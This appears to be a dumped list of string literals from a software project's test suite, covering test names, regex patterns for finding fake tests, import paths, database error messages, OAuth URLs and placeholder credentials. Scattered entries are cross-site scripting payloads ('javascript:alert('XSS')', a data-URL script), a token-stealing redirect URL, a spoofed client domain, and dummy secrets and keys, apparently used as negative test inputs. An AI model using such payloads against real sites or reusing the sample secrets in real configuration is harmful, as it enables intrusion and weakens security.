    "bin",
    "black_friday",
    "blocked",
    "body",
    "bold magenta",
    "branch_name",
    "build",
    "bulk",
    "businessValue",
    "business_impact",
    "business_value_coverage.json",
    "business_value_test_coverage",
    "business_value_test_coverage.xml",
    "by_priority",
    "by_type",
    "bytes",
    "cache",
    "cache_enabled",
    "cache_hit_rate",
    "cache_hits",
    "cache_stats",
    "cache_status",
    "cache_ttl_hours",
    "cached",
    "callback",
    "callback_result",
    "calls",
    "cascade_probability",
    "cascading_failure",
    "cat app/tests/examples/test_size_compliance_examples.py",
    "categories",
    "categories_scanned",
    "categories_with_history",
    "category",
    "category1",
    "category2",
    "category_based",
    "category_failure",
    "category_statistics",
    "caused exception:",
    "caused problematic database name",
    "caused unhandled exception when database is broken. This might expose system internals to attackers.",
    "caused wrong database name:",
    "center",
    "certificate",
    "certificate verify failed: certificate has expired",
    "challenge",
    "change_method",
    "changed test files...",
    "characters (",
    "characters required",
    "chars",
    "chars)",
    "chat:create",
    "chat:read_own",
    "check",
    "check_and_fix_attribute",
    "check_and_fix_import",
    "checked_in",
    "checked_out",
    "checks",
    "ch√§llenge_with_√ºn√Øcode",
    "ci",
    "circuit",
    "circuit_final_test_",
    "circuit_test_code_",
    "claims-user-456",
    "claims@example.com",
    "claims@netrasystems.ai",
    "class",
    "class (Test\\w+)[^:]*:",
    "class Test",
    "class TestSyntaxFix",
    "class TestSyntaxFix:",
    "class \\\\g<0>:",
    "class \\\\w+\\\\(unittest\\\\.TestCase\\\\):",
    "class\"\"\"\n    \n    def test_initialization(self):\n        \"\"\"Test",
    "class\\s+(\\w+)\\s*[\\(:]",
    "class\\s+Mock\\w*:",
    "class\\s+Mock\\w*Component",
    "class\\s+Test\\w*Component\\w*:",
    "class\\s+\\w*Component\\w*Mock\\w*:",
    "class\\s+\\w*Mock\\w*:",
    "class_based",
    "class_to_function",
    "classes",
    "claude-3-opus",
    "claude-3-sonnet",
    "clean@example.com",
    "cleanup",
    "cleanup                   ‚Üí Resource management validation",
    "cleanup_duration_seconds",
    "cleanup_expired_sessions",
    "cleanup_inactive_sessions",
    "cleanup_test_processes.py",
    "cleanup_timestamp",
    "clickhouse",
    "clickhouse-default-password",
    "clickhouse/test_realistic_clickhouse_operations.py",
    "clickhouse://localhost:9000/test",
    "clickhouse_connection",
    "clickhouse|ClickHouse",
    "client",
    "client-id..googleusercontent.com",
    "client-id.apps.google.com",
    "client-id.example.com",
    "client-id.googleusercontent.co",
    "client-id.googleusercontent.com.malicious.com",
    "client-id@googleusercontent.com",
    "client.get",
    "client.post",
    "clientId",
    "client_id",
    "client_id=",
    "client_secret",
    "cloud_sql",
    "cloudsql",
    "cls",
    "cmdline",
    "code",
    "code\u0000null_byte",
    "code-with_special.chars!",
    "code_challenge",
    "code_lines",
    "code_verifier",
    "collection_warnings",
    "combined_recommendations",
    "comes AFTER first import at line",
    "command",
    "commit_sha",
    "complete_",
    "complete_workflow",
    "complete_workflow         ‚Üí End-to-end integration validation",
    "completed",
    "completion",
    "completion_tokens",
    "complex_secure_password_123!@#",
    "complex_staging_password_123!",
    "complexity",
    "complexity_based",
    "compliance",
    "compliance_rate",
    "component",
    "component_coverage",
    "component_recovery_status",
    "components",
    "components_covered",
    "compose",
    "comprehensive",
    "comprehensive_fix_",
    "concurrent",
    "concurrent@example.com",
    "concurrent_code_",
    "concurrent_writes",
    "config",
    "config/alembic.ini",
    "config/pytest.ini",
    "config_check",
    "config_endpoint",
    "config_file",
    "config_fixes",
    "configuration",
    "configuration error",
    "configuration_files",
    "configuration_loading",
    "configuration_validation",
    "conftest.py",
    "conftest.py files** for pytest configuration\n- **",
    "conftest_files",
    "connect",
    "connect() got an unexpected keyword argument 'sslmode'",
    "connected",
    "connecting",
    "connection",
    "connection attempt",
    "connection failed for user \"",
    "connection failed: FATAL: database \"",
    "connection failed: FATAL: database \"postgres\" does not exist",
    "connection invalid due to previous postgres error",
    "connection pool exhausted",
    "connection refused",
    "connection timeout during recovery",
    "connection timeout exceeded",
    "connection to server at",
    "connection to server at \"/cloudsql/netra-staging:us-central1:netra-staging-db\" failed: FATAL: database \"netra_staging\" does not exist",
    "connection to server at \"/cloudsql/project:region:instance\" failed: FATAL: database \"postgres\" does not exist",
    "connection to server at \"localhost:5432\" failed: FATAL: database \"netra_dev\" does not exist\nDetail: The database \"netra_dev\" was not found on the server.\nHint: Check if the database name is correct.",
    "connection to server at \"localhost:5432\" failed: database \"netra_dev\" does not exist",
    "connection to server at \"localhost:5432\" failed: database \"netra_dev\" does not exist\nDetail: Connection attempt failed after 30 seconds\nHint: Check server logs for more information.",
    "connection to server at \"test-db-host\" (IP_ADDRESS), port 5432 failed: FATAL: database \"netra_staging\" does not exist",
    "connection to server failed: FATAL: database \"netra_dev\" does not exist",
    "connection to server failed: FATAL: database \"postgres\" does not exist",
    "connection to server failed: SSL connection has been closed unexpectedly",
    "connection to server failed: database \"postgres\" does not exist",
    "connection_pool_health",
    "connection_pool_status",
    "connection_timeout_validation",
    "connections not cleaned up",
    "connections not properly cleaned up",
    "conservative",
    "consistency-service",
    "consistency-test-service",
    "consistency-test-user",
    "consistency@example.com",
    "consistent latency",
    "consistently failing tests",
    "consistently_failing",
    "const\\s+Mock\\w*\\s*=",
    "const\\s+Mock\\w+\\s*=.*?return\\s*<",
    "const\\s+\\w+Form\\s*=.*?return\\s*<div",
    "const\\s+mock\\w*\\s*=",
    "content",
    "content-type",
    "content_generation",
    "content_preview",
    "content_similarity",
    "context.py",
    "continue",
    "continue_with_errors",
    "continue_with_mocks",
    "conversion",
    "convert_database_url",
    "core",
    "correct_session_67890",
    "correct_session_789",
    "correctly failed URL construction:",
    "correctpassword123!",
    "cors",
    "cors_validation",
    "cost",
    "cost-optimization",
    "cost_data",
    "cost_optimization",
    "cost_per_1k_input",
    "cost_per_1k_output",
    "cost_per_1k_tokens",
    "cost_per_request_usd",
    "cost_per_token_usd",
    "cost_usd",
    "cost|optimization|pricing|billing",
    "could not connect to server: Connection refused\nIs the server running and accepting connections?",
    "could not connect to server: database \"netra_dev\" does not exist",
    "count",
    "count_based",
    "coverage",
    "coverage-final.json",
    "coverage.json",
    "coverage_gaps",
    "coverage_info",
    "coverage_percentage",
    "coverage_source",
    "coverage_target",
    "cpu_bottleneck",
    "cpu_intensive",
    "cpu_percent",
    "create",
    "createMockComponent",
    "create_all",
    "create_async_engine",
    "create_module",
    "create_session",
    "create_tables",
    "create_user",
    "created_at",
    "creates 'netra_staging' which causes failures",
    "creates problematic database name:",
    "creates problematic postgres database:",
    "creation_method",
    "credential_issues",
    "critical",
    "critical modules with security/data operations",
    "critical modules...",
    "critical violations found",
    "critical violations requiring immediate fix",
    "critical-error",
    "critical/high severity fake tests",
    "critical_failure",
    "critical_files",
    "critical_paths",
    "critical_test_count",
    "critical_test_percentage",
    "criticality",
    "cross-category duplicates/highly similar tests. Consider creating shared test utilities or fixtures.",
    "cross-service@netrasystems.ai",
    "cross_category_overlaps",
    "csrf",
    "csrf_test_code_",
    "csv",
    "curl",
    "curl/7.68.0",
    "current",
    "current transaction is aborted",
    "current_password",
    "custom",
    "customer_service",
    "customer_value_features",
    "customers",
    "cy:run",
    "cyan",
    "cypress",
    "cypress/e2e",
    "cypress/e2e/**/*.cy.ts",
    "cypress:open",
    "dashboard.md",
    "data",
    "data-service",
    "data1",
    "data2",
    "data:text/html,<script>alert('XSS')</script>",
    "data_validators",
    "database",
    "database \"netra_dev\" does not exist",
    "database \"postgres\" does not exist",
    "database initialization failed",
    "database-exhaustion",
    "database_available",
    "database_connection",
    "database_deadlock",
    "database_dependent",
    "database_down",
    "database_error_count",
    "database_exists",
    "database_info",
    "database_recovered",
    "database_recovering",
    "database_response_time",
    "database_scripts",
    "database_status",
    "database_unavailable",
    "database_unavailable_action",
    "database_url",
    "database_version",
    "database|db|postgres|clickhouse|orm",
    "datetime",
    "day_of_week",
    "db",
    "db_latencies",
    "db_queries",
    "debug",
    "debug_script",
    "decorator spacing",
    "decorator spacing for sync functions",
    "def",
    "def __init__(self):",
    "def _setup_test_data(self):\n        \"\"\"Setup test data and configurations\"\"\"",
    "def _verify_results(self, results):\n        \"\"\"Verify test results and assertions\"\"\"",
    "def mock_components",
    "def real_components",
    "def test_",
    "def test_\\\\w+\\\\([^)]*\\\\):[^{]*?(?:pass|return)",
    "def test_{name}(self):\\n        \"\"\"Test {path}\"\"\"\\n        # Critical path that must be tested\\n        # TODO: Implement comprehensive test\\n        pass\\n    \\n",
    "def\\s+(\\w+)",
    "def\\s+(\\w+)\\s*\\(",
    "def\\s+\\w*_mock\\w*",
    "def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*\\.\\.\\.\\s*$",
    "def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*pass\\s*$",
    "def\\s+\\w+\\(\\*args\\s*,\\s*\\*\\*kwargs\\)\\s*:\\s*\\n.*return\\s*\\{",
    "def\\s+create_mock_\\w*component",
    "def\\s+mock_\\w*_component",
    "def\\s+mock_\\w+",
    "default",
    "default password",
    "defaults to 'postgres' database:",
    "degradation_factor",
    "degradation_reason",
    "degradation_since",
    "degraded",
    "degraded_functionality",
    "degraded_functionality_warning",
    "delete",
    "delta",
    "denied",
    "dependencies",
    "dependency_aware",
    "dependency_resolution",
    "dependency_resolution     ‚Üí test_06_services_starting_before_dependencies",
    "deploy_to_gcp.py",
    "deployment_related",
    "deployment_validation",
    "deprecated",
    "describe(",
    "describe\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
    "description",
    "desktop",
    "detail",
    "detailed_analysis",
    "detailed_metrics",
    "details",
    "dev",
    "dev-jwt-secret-1234567890123456789012345",
    "devDependencies",
    "dev_client_id_123",
    "dev_google_client_123",
    "dev_launcher/tests",
    "dev_secret_456",
    "development",
    "development mode",
    "development_mode",
    "development_mode_notice",
    "development_password",
    "device",
    "device_",
    "device_id",
    "diagnosis_assistance",
    "diff",
    "different-staging-secret-1234567890123456789012345",
    "dim",
    "directories",
    "directories:",
    "directory",
    "disabled",
    "disabled:test",
    "disconnected",
    "dist",
    "dist-packages",
    "docker",
    "docker run --name postgres -e POSTGRES_PASSWORD=password -p 5432:5432 -d postgres",
    "docker-compose",
    "docker-compose.test.yml",
    "document_analysis",
    "does not exist",
    "does not exist (OK if service has no tests)",
    "does not exist, skipping.",
    "doesn't need splitting (",
    "dos_effective",
    "dry_run",
    "dummy",
    "dummy_refresh",
    "duplicate",
    "duplicate MagicMock import",
    "duplicate tests",
    "duplicates",
    "duration",
    "duration_days",
    "e2e",
    "e2e-user",
    "e2e@netrasystems.ai",
    "e2e_coverage",
    "early",
    "early|starter|standard",
    "ecommerce",
    "efficiency",
    "element",
    "email",
    "email_verified",
    "emerald",
    "empty password",
    "empty/auto-pass tests immediately",
    "empty_implementation",
    "empty_implementations",
    "enabled",
    "end-to-end",
    "end_line",
    "end_lineno",
    "end_of_quarter",
    "end_time",
    "end_to_end",
    "endpoint",
    "endpoint_availability",
    "endpoints",
    "enforce_session_limits",
    "english",
    "enterprise",
    "enterprise:api_access",
    "enterprise:manage_billing",
    "enterprise:manage_teams",
    "enterprise:view_analytics",
    "enterprise|premium|sso|saml|sla",
    "env",
    "env vars",
    "env.ACT",
    "env_",
    "env_file",
    "env_vars",
    "environment",
    "environment in ['staging', 'production', 'prod']",
    "environment!\nExpected:",
    "environment_consistency",
    "environment_name",
    "error",
    "error rate",
    "error:",
    "error_cascade",
    "error_cascades",
    "error_code",
    "error_description",
    "error_details",
    "error_handlers",
    "error_handling",
    "error_message",
    "error_rate",
    "error_score",
    "error_type",
    "errors",
    "estimatedTime",
    "estimated_improvement",
    "estimated_lines",
    "estimated_recovery",
    "estimated_recovery_time",
    "estimated_revenue_usd",
    "event_metadata",
    "event_type",
    "ex",
    "exact duplicate test pairs. These should be immediately reviewed and consolidated.",
    "example.com",
    "example_message_id",
    "example_message_metadata",
    "examples",
    "excellent",
    "exception",
    "exception:",
    "excessive_mocking",
    "execution_plan",
    "execution_results",
    "exists in",
    "exit_code",
    "exp",
    "expect(",
    "expected_exit_code",
    "expected_pass",
    "expected_patterns",
    "expected_response",
    "expected_status",
    "expected_valid",
    "expected_value",
    "expired",
    "expired.token.signature",
    "expired1",
    "expired123",
    "expired_session",
    "expired_sessions_cleaned",
    "expires_at",
    "expires_in",
    "exponential",
    "exponential_spread",
    "external_services",
    "extract-user",
    "extract@netrasystems.ai",
    "extract_utilities",
    "extraction_attempts",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.malformed",
    "eyJhbGciOiJIUzI1NiJ9.",
    "f",
    "facebook",
    "facebook_login",
    "fail_fast",
    "fail_fast_enabled",
    "fail_fast_threshold",
    "failed",
    "failed attempts",
    "failed to exchange authorization code",
    "failed with status",
    "failed:",
    "failed_files",
    "failed_migration_detected",
    "failed_requests",
    "failed_tests",
    "failing",
    "failing tests",
    "failing tests to process",
    "failing tests** tracked in bad_tests.json",
    "failing_agent",
    "failing_tests",
    "failure",
    "failure:",
    "failure_rate",
    "failure_reason",
    "failure_scan.json",
    "failure_start",
    "failures",
    "failures_found",
    "fair",
    "fake",
    "fake tests found",
    "fake tests found in",
    "fake tests in",
    "fake tests requiring attention",
    "fake tests, severity:",
    "fake-service",
    "fake_access_token",
    "fake_session_456",
    "fake_session_id",
    "fake_test_count",
    "fake_tests",
    "fake_tests_by_directory",
    "fake_tests_by_severity",
    "fake_tests_by_type",
    "fake_token",
    "fallback",
    "fallback_mode",
    "fallback_permission_granted",
    "false",
    "family_name",
    "fast",
    "fastapi",
    "feature",
    "feature_availability",
    "feature_based",
    "feature_level_status",
    "feature_status",
    "fernet-key",
    "fernet_key",
    "file",
    "file=",
    "file_analyses",
    "file_error",
    "file_fixes",
    "file_path",
    "file_path,line_number,violation_type,severity,description,recommended_action",
    "file_pattern",
    "file_size",
    "file_splits",
    "file_system",
    "files",
    "files (already correct or no setup_test_path)",
    "files (use --limit=N to change)",
    "files don't use setup_test_path",
    "files fixed:",
    "files have correct import order",
    "files have import order issues",
    "files in priority order:",
    "files with issues",
    "files with references:",
    "files with size violations addressed",
    "files with syntax errors",
    "files)",
    "files):",
    "files** in test_framework directory",
    "files, modified",
    "files_affected",
    "files_created",
    "files_exceeding_300_lines",
    "files_exceeding_limit",
    "files_fixed",
    "files_over_300",
    "files_processed",
    "files_split",
    "files_with_errors",
    "files_with_long_functions",
    "files_with_mock_components",
    "find",
    "finish_reason",
    "fintech",
    "first_failure",
    "first_use",
    "fix_applied",
    "fix_attempted",
    "fix_command",
    "fix_delegated",
    "fix_module_import",
    "fix_needed",
    "fix_strategy",
    "fix_suggestion",
    "fixed",
    "fixes",
    "fixes_applied",
    "fixture",
    "fixture_similarity",
    "fixtures",
    "fixtures.py",
    "flaky",
    "flaky_tests",
    "flu_season",
    "focused test functions or use helper methods",
    "focused test modules",
    "following backend pattern",
    "for functions to implement",
    "for input",
    "for splitting opportunities...",
    "formatDuration formats time correctly",
    "formatLatency formats latency correctly",
    "framework",
    "fraud_detection",
    "free",
    "free|trial|basic|onboarding",
    "from",
    "from .",
    "from app\\.",
    "from conftest import",
    "from netra_backend",
    "from netra_backend.",
    "from netra_backend.app.",
    "from netra_backend.app.agents.tool_dispatcher import ToolDispatcher",
    "from netra_backend.app.llm.llm_manager import LLMManager",
    "from netra_backend.app.models.session import Session as UserSession",
    "from netra_backend.app.models.user import User\n# UserPlan not yet implemented - using placeholder\nUserPlan = type('UserPlan', (), {'FREE': 'free', 'EARLY': 'early', 'MID': 'mid', 'ENTERPRISE': 'enterprise'})",
    "from netra_backend.app.websocket.connection_manager import ConnectionManager as WebSocketConnectionManager",
    "from netra_backend.app.websocket_core.manager import WebSocketManager as UnifiedWebSocketManager",
    "from netra_backend.tests.conftest import",
    "from netra_backend.tests.fixtures",
    "from netra_backend.tests.helpers",
    "from netra_backend.tests.test_utils import setup_test_path",
    "from netra_backend\\.app\\.db\\.clickhouse import ClickHouseManager",
    "from netra_backend\\.app\\.db\\.models_agent import Agent, AgentRun",
    "from netra_backend\\.app\\.db\\.models_agent import AgentRun",
    "from netra_backend\\.app\\.models\\.conversion_event import ConversionEvent",
    "from netra_backend\\.app\\.models\\.message import Message",
    "from netra_backend\\.app\\.models\\.session import UserSession",
    "from netra_backend\\.app\\.models\\.team import Team",
    "from netra_backend\\.app\\.models\\.thread import Thread",
    "from netra_backend\\.app\\.models\\.user import User, UserPlan",
    "from netra_backend\\.app\\.websocket\\.connection_manager import WebSocketConnectionManager",
    "from netra_backend\\.tests\\.e2e\\.data",
    "from netra_backend\\.tests\\.e2e\\.fixtures",
    "from netra_backend\\.tests\\.e2e\\.helpers",
    "from netra_backend\\.tests\\.e2e\\.infrastructure",
    "from netra_backend\\.tests\\.e2e\\.validators",
    "from netra_backend\\.tests\\.integration\\.database_test_fixtures import.*",
    "from netra_backend\\.tests\\.test_utils",
    "from netra_backend\\.tests\\.test_utils import setup_test_path\\n",
    "from netra_backend\\.tests\\.user_flow_base import.*",
    "from netra_backend\\.tests\\.user_journey_data import.*",
    "from pathlib import Path",
    "from test_framework.\\1 import",
    "from test_framework\\.(\\w+) import",
    "from tests.e2e.account_deletion_flow_manager",
    "from tests.e2e.agent_conversation_helpers",
    "from tests.e2e.auth_flow_testers",
    "from tests.e2e.config",
    "from tests.e2e.config import",
    "from tests.e2e.data",
    "from tests.e2e.fixtures",
    "from tests.e2e.fixtures.core.thread_test_fixtures_core",
    "from tests.e2e.fixtures.high_volume_data",
    "from tests.e2e.helpers",
    "from tests.e2e.helpers.",
    "from tests.e2e.helpers.auth.oauth_journey_helpers",
    "from tests.e2e.helpers.chat_helpers",
    "from tests.e2e.helpers.core.chat_helpers",
    "from tests.e2e.helpers.core.unified_flow_helpers",
    "from tests.e2e.helpers.database.database_sync_helpers",
    "from tests.e2e.helpers.database_sync_helpers",
    "from tests.e2e.helpers.journey.journey_validation_helpers",
    "from tests.e2e.helpers.journey.new_user_journey_helpers",
    "from tests.e2e.helpers.journey.real_service_journey_helpers",
    "from tests.e2e.helpers.journey.user_journey_helpers",
    "from tests.e2e.helpers.journey_validation_helpers",
    "from tests.e2e.helpers.new_user_journey_helpers",
    "from tests.e2e.helpers.oauth_journey_helpers",
    "from tests.e2e.helpers.real_service_journey_helpers",
    "from tests.e2e.helpers.unified_flow_helpers",
    "from tests.e2e.helpers.user_journey_helpers",
    "from tests.e2e.helpers.websocket.websocket_test_helpers",
    "from tests.e2e.helpers.websocket_test_helpers",
    "from tests.e2e.infrastructure",
    "from tests.e2e.integration.auth_flow_manager",
    "from tests.e2e.jwt_token_helpers",
    "from tests.e2e.jwt_token_helpers import",
    "from tests.e2e.oauth_test_providers",
    "from tests.e2e.oauth_test_providers import",
    "from tests.e2e.onboarding_flow_executor",
    "from tests.e2e.test_helpers.performance_base",
    "from tests.e2e.validators",
    "from tests.test_utils",
    "from tests\\.config",
    "from tests\\.config import",
    "from tests\\.e2e\\.auth_flow_testers",
    "from tests\\.e2e\\.high_volume_data",
    "from tests\\.e2e\\.integration\\.account_deletion_flow_manager",
    "from tests\\.e2e\\.integration\\.agent_conversation_helpers",
    "from tests\\.e2e\\.integration\\.auth_flow_manager",
    "from tests\\.e2e\\.integration\\.onboarding_flow_executor",
    "from tests\\.e2e\\.integration\\.thread_test_fixtures_core",
    "from tests\\.e2e\\.performance_base",
    "from tests\\.e2e\\.thread_test_fixtures_core",
    "from tests\\.fixtures",
    "from tests\\.helpers",
    "from tests\\.jwt_token_helpers",
    "from tests\\.jwt_token_helpers import",
    "from tests\\.oauth_test_providers",
    "from tests\\.oauth_test_providers import",
    "from tests\\.unified\\.e2e\\.fixtures",
    "from tests\\.unified\\.e2e\\.helpers",
    "from typing import",
    "from typing import Dict, Any, List, Optional",
    "from typing import List, Dict, Tuple, Optional, Any",
    "from unittest.mock import",
    "from unittest.mock import AsyncMock, MagicMock, Mock, patch",
    "from unittest.mock import Mock, MagicMock, patch",
    "from unittest\\.mock import.*MagicMock.*MagicMock",
    "frontend",
    "frontend-user",
    "frontend/__tests__/system/startup.test.tsx",
    "frontend/components/chat",
    "frontend/tests",
    "frontend/tests/conftest.py",
    "frontend@netra.com",
    "frontend_coverage",
    "frontend_url",
    "full",
    "full_",
    "full_degradation_allowed",
    "full_name",
    "full_path",
    "full_url",
    "function",
    "function\\s+mock\\w*\\s*\\(",
    "function_name",
    "function_refactors",
    "function_size",
    "function_to_fixture",
    "function_to_function",
    "functionality tests.\n\"\"\"\n\nimport pytest\nimport asyncio\nfrom typing import Dict, List, Any, Optional",
    "functions",
    "functions)",
    "functions_exceeding_limit",
    "functions_optimized",
    "functions_over_8",
    "functions_to_implement.txt",
    "gamma",
    "gc_count",
    "gcloud secrets versions add postgres-db-staging --data-file=<new_db_name>",
    "gemini",
    "gemini-1.5-flash",
    "gemini-2.5-flash",
    "gemini-2.5-pro",
    "gemini-api-key",
    "gemini-pro",
    "generated_at",
    "generated_files",
    "generic-client-id",
    "generic-client-secret",
    "generic_error",
    "generic_oauth",
    "get",
    "getConnectionQuality categorizes latency correctly",
    "getConnectionState converts WebSocket status correctly",
    "getStatusInfo returns correct display info",
    "get_all",
    "get_auth_database_url_async",
    "get_auth_database_url_async must be callable",
    "get_auth_database_url_async should be callable",
    "get_auth_database_url_async should return string",
    "get_auth_service_url",
    "get_database_url",
    "get_environment",
    "get_frontend_url",
    "get_google_client_id",
    "get_google_client_secret",
    "get_jwt_secret",
    "get_session",
    "git",
    "github",
    "github_access_",
    "github_access_token_123",
    "github_refresh_token_123",
    "given_name",
    "good",
    "google",
    "google_123456",
    "google_access_",
    "google_access_token_123",
    "google_client_123",
    "google_client_id",
    "google_console_alignment",
    "google_id_token_123",
    "google_oauth_response_time",
    "google_refresh_",
    "google_refresh_token_123",
    "google_test_user_123",
    "google_user_1",
    "google_user_2",
    "google_user_3",
    "gpt-3.5-turbo",
    "gpt-4",
    "gpt-4-turbo",
    "graceful_degradation",
    "graceful_degradation      ‚Üí test_10_graceful_degradation_optional_services",
    "gradual_increase",
    "grant_method",
    "granted_at",
    "granted_by",
    "green",
    "guessed_secret",
    "hacker-user",
    "hacker-user-999",
    "hacker@evil.com",
    "had unhandled exception:",
    "handler",
    "handlers",
    "hardcoded_test_data",
    "hardcoded_wait",
    "harness.py",
    "has",
    "has failing tests!",
    "has no attribute 'get_auth_database_url_async'",
    "has no end-to-end tests",
    "has only",
    "has_cloud_sql",
    "has_docstring",
    "has_return",
    "has_ssl",
    "hashed_password",
    "head",
    "header..signature",
    "header.payload",
    "header.payload.signature.extra",
    "headers",
    "health",
    "health:test",
    "health_check_passed",
    "health_details",
    "health_endpoint",
    "health_password",
    "health_status",
    "health_user",
    "healthcare",
    "healthy",
    "heap size",
    "help_display",
    "helper",
    "helpers)",
    "helpers.py",
    "high",
    "high failure rate tests",
    "high_error_rate",
    "high_failure_rate",
    "high_latency",
    "high_load",
    "high_value_test_count",
    "highlight",
    "highly similar test pairs. Consider refactoring these using parametrized tests or test utilities.",
    "highly_similar",
    "history",
    "hit_rate",
    "hits",
    "hmac-secret",
    "hmac_test_code_",
    "holiday_season",
    "hooks",
    "host",
    "host.com:5432",
    "hour_of_day",
    "html",
    "htmlcov",
    "http",
    "http://",
    "http://localhost",
    "http://localhost:",
    "http://localhost:18001",
    "http://localhost:3000",
    "http://localhost:3000,http://localhost:3001",
    "http://localhost:3000/auth/callback",
    "http://localhost:3001",
    "http://localhost:8000",
    "http://localhost:8000/health",
    "http://localhost:8080",
    "http://localhost:8081",
    "http://localhost:8081/auth/callback",
    "http://localhost:8081/auth/callback/google",
    "http://localhost:8081/auth/dev/login",
    "http://localhost:8081/auth/login",
    "http://localhost:8081/auth/logout",
    "http://localhost:8081/auth/token",
    "http://localhost:8081/auth/verify",
    "http://localhost:8081/health",
    "http://localhost:8083",
    "http://malicious-site.com",
    "http_client",
    "https://",
    "https://accounts.google.com",
    "https://api.netra.systems",
    "https://api.staging.netra.ai",
    "https://api.staging.netrasystems.ai",
    "https://app.example.com",
    "https://app.example.com/auth/callback",
    "https://app.staging.netra.ai",
    "https://app.staging.netrasystems.ai",
    "https://app.staging.netrasystems.ai/auth/callback",
    "https://auth-service.staging.netra.ai",
    "https://auth.example.com/auth/login",
    "https://auth.example.com/auth/logout",
    "https://auth.example.com/auth/token",
    "https://auth.example.com/auth/verify",
    "https://auth.netrasystems.ai",
    "https://auth.netrasystems.ai/auth/callback",
    "https://auth.netrasystems.ai/auth/callback/google",
    "https://auth.staging.netrasystems.ai",
    "https://auth.staging.netrasystems.ai/auth/callback",
    "https://auth.staging.netrasystems.ai/auth/callback/google",
    "https://avatars.githubusercontent.com/",
    "https://dev.netra.systems",
    "https://evil-site.com",
    "https://evil-site.com/steal-token",
    "https://evil.com",
    "https://example.com/avatar.jpg",
    "https://example.com/avatar/",
    "https://example.com/john.jpg",
    "https://example.com/photo.jpg",
    "https://github.com",
    "https://login.microsoftonline.com",
    "https://malicious-provider.com",
    "https://malicious-site.com",
    "https://netrasystems.ai",
    "https://netrasystems.ai/auth/callback",
    "https://other-provider.com",
    "https://staging.netra.ai/auth/callback",
    "https://staging.netra.systems",
    "httpx",
    "httpx.AsyncClient",
    "httpx.AsyncClient.get",
    "httpx.AsyncClient.post",
    "hybrid",
    "iZAG-Kz661gRuJXEGzxgghUFnFRamgDrjDXZE6HdJkw=",
    "iat",
    "id",
    "id_token",
    "identified_bottlenecks",
    "ignored - shutdown took",
    "immediate_fixes",
    "impact_analysis",
    "impact_level",
    "impact_multiplier",
    "import",
    "import (",
    "import *",
    "import app\\.",
    "import netra_backend",
    "import netra_backend.app.",
    "import pytest",
    "import pytest\\n",
    "import sys",
    "import tests.e2e.auth_flow_testers",
    "import tests.e2e.config",
    "import tests.e2e.jwt_token_helpers",
    "import tests.e2e.oauth_test_providers",
    "import tests\\.config",
    "import tests\\.e2e\\.auth_flow_testers",
    "import tests\\.jwt_token_helpers",
    "import tests\\.oauth_test_providers",
    "import unittest",
    "import unittest\\\\n",
    "import\\s+(.+)",
    "import_correction",
    "import_errors",
    "import_fixes",
    "import_similarity",
    "imports",
    "in",
    "inactive123",
    "inactive_sessions_cleaned",
    "include",
    "include_router",
    "incorrect_password",
    "indicators",
    "inf",
    "info",
    "information_schema",
    "infrastructure_costs_usd",
    "infrastructure_plumbing",
    "init",
    "initialization\"\"\"\n        # TODO: Test class instantiation\n        pass",
    "initialize",
    "initiate_google_oauth",
    "input",
    "inputs",
    "install",
    "instances failed",
    "instead of",
    "insufficient_scope",
    "integration",
    "integration_tests",
    "internal overlaps. Consider reorganizing tests or extracting common test utilities.",
    "internal_error",
    "internal_overlaps",
    "into",
    "invalid",
    "invalid syntax",
    "invalid user pattern",
    "invalid!@#base64",
    "invalid-client-id",
    "invalid-email",
    "invalid-token-format",
    "invalid.jwt.token",
    "invalid.token",
    "invalid.token.format",
    "invalid.token.here",
    "invalid.token.signature.extra",
    "invalid://url",
    "invalid==base64",
    "invalid_challenge",
    "invalid_challenge_value",
    "invalid_code",
    "invalid_combination",
    "invalid_grant",
    "invalid_hash",
    "invalid_or_expired_token",
    "invalid_request",
    "invalid_run_id",
    "invalid_state",
    "invalid_token",
    "invalid_url",
    "invalid_user_pattern",
    "invalid_wait",
    "io_bound",
    "ios_",
    "ip_address",
    "is already failing!",
    "is_active",
    "is_active must be boolean",
    "is_cloud_sql_environment",
    "is_cloud_sql_environment must be callable",
    "is_cloud_sql_environment should be callable",
    "is_cloud_sql_environment should return boolean",
    "is_cloud_sql_environment should return boolean, got:",
    "is_ready",
    "is_test_environment",
    "is_test_environment must be callable",
    "is_test_environment should be callable",
    "is_test_environment should return boolean",
    "is_test_environment should return boolean, got:",
    "is_test_mode",
    "is_verified",
    "is_weekend",
    "isolated",
    "isolation",
    "iss",
    "issue",
    "issuer",
    "issuer-test@netrasystems.ai",
    "issues",
    "it(",
    "it\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
    "items)",
    "iteration",
    "iteration test-fix loop",
    "iterations",
    "iterations!",
    "javascript:",
    "javascript:alert('XSS')",
    "javascript:alert('attack')",
    "jest",
    "jest mocks (jest.fn:",
    "jest.config.*",
    "jest.config.cjs",
    "jest.fn()",
    "jest.mock(",
    "jest.setup.js",
    "jest.setup.real.js",
    "jest\\.fn\\(\\)",
    "jest\\.mock\\(",
    "jest\\.mock\\([\\'\"`][^\\'\"`]+[\\'\"`],\\s*\\(\\)\\s*=>\\s*\\(\\{[\\s\\S]+?return\\s*<div",
    "journeys",
    "js_excessive_mocking",
    "js_function_size",
    "js_mock_component",
    "json",
    "json_output",
    "json_output_format",
    "jti",
    "justification",
    "justified",
    "jwt",
    "jwt-secret-key",
    "jwt_handler",
    "jwt_secret_consistency",
    "jwt_secret_key",
    "largest_file",
    "largest_function",
    "last_activity",
    "last_database_check",
    "latency_distribution",
    "latency_ms",
    "latency_p50_ms",
    "latency_p95_ms",
    "latency_range_ms",
    "latest/unit_report.md",
    "latin-1",
    "legacy",
    "legacy test files...",
    "legacy-secret-1234567890123456789012345",
    "legacy_framework",
    "length",
    "level",
    "lib",
    "lib64",
    "limit-test-",
    "limited_degradation",
    "line",
    "line limit",
    "line limit (SPEC/testing.xml)",
    "line limit:",
    "line limit:**",
    "line_number",
    "linear_decline",
    "lineno",
    "lines",
    "lines (+",
    "lines (limit:",
    "lines (max:",
    "lines and should be manually reviewed.",
    "lines)",
    "lines) manually",
    "lines):",
    "lines, exceeds 25-line limit",
    "lines, exceeds 450-line limit",
    "lines, exceeds reasonable limit",
    "lines, limit is",
    "lint",
    "llama-2-70b",
    "llm",
